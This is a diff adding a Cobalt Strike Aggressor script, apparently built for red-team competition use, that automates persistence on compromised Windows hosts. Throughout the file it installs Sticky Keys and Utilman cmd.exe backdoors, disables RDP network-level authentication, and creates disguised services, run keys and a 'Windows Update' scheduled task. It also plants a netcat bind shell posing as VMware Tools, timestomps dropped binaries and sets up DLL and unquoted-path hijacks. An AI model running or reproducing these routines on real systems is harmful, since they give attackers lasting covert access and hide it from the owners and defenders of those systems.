@@ -1,0 +1,237 @@
+#################################################
+# Created by @jgaudard  :: I don't twitter much
+# Aggressor script for persistence
+# !!! Must create executables for upload. !!!
+# Created: 3 March 2017 Modified: 28 Mar 2017
+# Version 2.1
+#
+# References: 
+# https://blog.cobaltstrike.com/2016/03/16/my-cobalt-strike-scripts-from-neccdc/
+# https://fixingitpro.com/2011/07/06/disabling-rdp-network-level-authentication-nla-remotely-via-the-registry/
+# https://room362.com/post/2012/2012-05-24-sticky-keys-and-utilman-against-nla/
+# https://www.commonexploits.com/unquoted-service-paths/
+########################################
+
+sub stickykeys {
+    binput($1, 'Running setup for StickyKeys');
+    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
+    bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
+    bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f');
+    bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f');
+    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d "0" /f');
+    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f');
+    bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
+    bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
+    bshell($1, 'net start TermService');
+    binput($1, 'Running setup for PSRemoting');
+    bpowershell($1, 'Enable-PSRemoting -Force');
+}
+
+sub persist_diagsvc {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("diagsvc.exe")) {
+            blog($1, "Setting up 'Diagnostic System Manager Service Persistence'");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("diagsvc.exe"));
+            btimestomp($1, "diagsvc.exe", "cmd.exe");
+            bshell($1, 'sc delete diagsvc');
+            bshell($1, 'sc create diagsvc binPath= "C:\windows\diagsvc.exe" start= auto DisplayName= "Diagnostic System Manager"');
+            bshell($1, 'sc description diagsvc "The Diagnostic System Manager is used by the Diagnostic System Host service to manage diagnostics and run in a system context. If this service is stopped any diagnostics that depend on it will no longer function."');
+        }
+        else {
+            berror($1, "diagsvc.exe does not exist :(");
+        }
+    }
+    else {
+        if (-exists script_resource("diagsvc32.exe")) {
+            blog($1, "Setting up 'Diagnostic System Manager Service Persistence'");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("diagsvc32.exe"));
+            btimestomp($1, "diagsvc32.exe", "cmd.exe");
+            bshell($1, 'sc delete diagsvc');
+            bshell($1, 'sc create diagsvc binPath= "C:\windows\diagsvc32.exe" start= auto DisplayName= "Diagnostic System Manager"');
+            bshell($1, 'sc description diagsvc "The Diagnostic System Manager is used by the Diagnostic System Host service to manage diagnostics and run in a system context. If this service is stopped any diagnostics that depend on it will no longer function."');
+        }
+        else {
+            berror($1, "diagsvc32.exe does not exist :(");
+        }
+    }    
+}
+sub persist_runkey_ie {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("jsdbgui.exe")) {
+            blog($1, "Setting up run key persistence for jsdbgui.exe");
+            bcd($1, 'c:\\program files\\internet explorer');
+            bupload($1, script_resource("jsdbgui.exe"));
+            btimestomp($1, "jsdbgui.exe", "jsdbgui.dll");
+            bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Java Script Debug GUI" /t REG_SZ /d "C:\Program Files\Internet Explorer\jsdbgui.exe" /f');
+        }
+        else {
+            berror($1, "jsdbgui.exe does not exist :(");
+        }
+    }
+    else {
+        if (-exists script_resource("jsdbgui32.exe")) {
+            blog($1, "Setting up run key persistence for jsdbgui.exe");
+            bcd($1, 'c:\\program files\\internet explorer');
+            bupload($1, script_resource("jsdbgui32.exe"));
+            bshell($1, "move c:\\program files\\internet explorer\\jsdbgui32.exe c:\\program files\\internet explorer\\jsdbgui.exe");
+            btimestomp($1, "jsdbgui.exe", "jsdbgui.dll");
+            bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Java Script Debug GUI" /t REG_SZ /d "C:\Program Files\Internet Explorer\jsdbgui.exe" /f');
+        }
+        else {
+            berror($1, "jsdbgui32.exe does not exist :(");
+        }
+    }    
+}
+sub persist_runkey_netcat {
+    if (-exists script_resource("vmtools.exe")) {
+        blog($1, "Setting up run key persistence for vmtools.exe");
+        bcd($1, 'c:\\program files\\vmware\\vmware tools');
+        bupload($1, script_resource("vmtools.exe"));         ### copy /usr/share/windows-binaries/nc.exe to script directory
+        btimestomp($1, "vmtools.exe", "vmtoolsd.exe");
+        bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VMware Tools" /t REG_SZ /d "C:\Program Files\Internet Explorer\vmtools.exe -lp 8080 -e cmd.exe" /f');
+    }
+    else {
+        berror($1, "vmtools.exe does not exist :(");
+    }
+}
+sub persist_scorebot {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("scorebot.exe")) {
+            blog($1, "Setting up Scorebot Service Persistence");
+            bcd($1, 'c:\windows\system32');
+            bupload($1, script_resource("scorebot.exe"));
+            btimestomp($1, "scorebot.exe", "cmd.exe");
+            bshell($1, 'sc delete scorebot');
+            bshell($1, 'sc create scorebot binPath= "C:\windows\scorebot.exe" start= auto DisplayName= "Scoring Engine Service"');
+            bshell($1, 'sc description scorebot "Scoring engine required for white team tracking uptime and services of the host."');
+            bshell($1, 'sc start scorebot');
+        }
+        else {
+            berror($1, "scorebot.exe does not exist :(");
+        }
+    }
+    else {
+        if (-exists script_resource("scorebot32.exe")) {
+            blog($1, "Setting up Scorebot Service Persistence");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("scorebot32.exe"));
+            btimestomp($1, "scorebot32.exe", ".\\system32\\cmd.exe");
+            bshell($1, 'sc delete scorebot');
+            bshell($1, 'sc create scorebot binPath= "C:\windows\scorebot32.exe" start= auto DisplayName= "Scoring Engine Service"');
+            bshell($1, 'sc description scorebot "Scoring engine required for white team tracking uptime and services of the host."');
+            bshell($1, 'sc start scorebot');
+        }
+        else {
+            berror($1, "scorebot.exe does not exist :(");
+        }  
+    }
+}
+
+sub persist_linkinfo {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("linkinfo.dll")) {
+            blog($1, "Setting up linkinfo.dll persistence.");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("linkinfo.dll"));
+            btimestomp($1, "linkinfo.dll", 'c:\\windows\\sysnative\\linkinfo.dll');
+        }
+        else {
+            berror($1, "linkinfo.dll not found.");
+        }
+    }
+    else {
+        if (-exists script_resource("linkinfo32.dll")) {
+            blog($1, "Setting up linkinfo.dll persistence.");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("linkinfo32.dll"));
+            bshell($1, "move c:\\windows\\linkinfo32.dll c:\\windows\\linkinfo.dll");
+            btimestomp($1, "linkinfo.dll", 'c:\\windows\\sysnative\\linkinfo.dll');
+        }
+        else {
+            berror($1, "linkinfo32.dll not found.");
+        }
+    }
+}    
+sub persist_unquotepath {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("program.exe")) {
+            blog($1, "Setting up unquoted path persistence with c:\windows\program.exe");
+            bcd($1, 'c:\\');
+            bupload($1, script_resource("program.exe"));
+            btimestomp($1, "program.exe", "c:\\windows\\explorer.exe");
+        }
+        else {
+        berror($1, "program.exe not found");
+        }
+    }
+    else {
+        if (-exists script_resource("program32.exe")) {
+            blog($1, "Setting up unquoted path persistence with c:\windows\program.exe");
+            bcd($1, 'c:\\');
+            bupload($1, script_resource("program32.exe"));
+            bshell($1, "move c:\\program32.exe c:\\program.exe");
+            btimestomp($1, "program.exe", "c:\\windows\\explorer.exe");
+        }
+        else {
+        berror($1, "program32.exe not found");
+        }
+    }
+}
+sub persist_schjob {
+    bshell($1, 'schtasks /create /TN "Windows Update" /SC ONLOGON /TR "\\127.0.0.1\update\update.exe"');
+}
+
+popup beacon_top {
+    menu "Persist" {
+        item "Persist (scorebot)" {
+            local('$bid');
+            foreach $bid ($1) {
+                persist_scorebot($bid);
+            }
+        }
+        item "Persist (linkinfo)" {
+            local('$bid');
+            foreach $bid ($1) {
+                persist_linkinfo($bid);
+            }
+        }
+        item "Persist (diagsvc)" {
+            local('$bid');
+            foreach $bid ($1) {
+                persist_diagsvc($bid);
+            }
+        }
+        item "Persist (runkey_ie)" {
+            local('$bid');
+            foreach $bid ($1) {
+                persist_runkey_ie($bid);
+            }
+        }    
+        item "Persist (runkey_netcat)" {
+            local('$bid');
+            foreach $bid ($1) {
+                persist_runkey_netcat($bid);
+            }
+        }         
+        item "Sticky Keys" {
+            local('$bid');
+            foreach $bid ($1) {
+                stickykeys($bid);
+            }
+        }
+        item "Scheduled Job" {
+            local('$bid');
+            foreach $bid ($1) {
+                persist_schjob($bid);
+            }
+        }
+        item "Unquoted Service Path" {
+            local('$bid');
+            foreach $bid ($1) {
+                persist_unquotepath($bid);
+            }
+        }
+    }
+}    
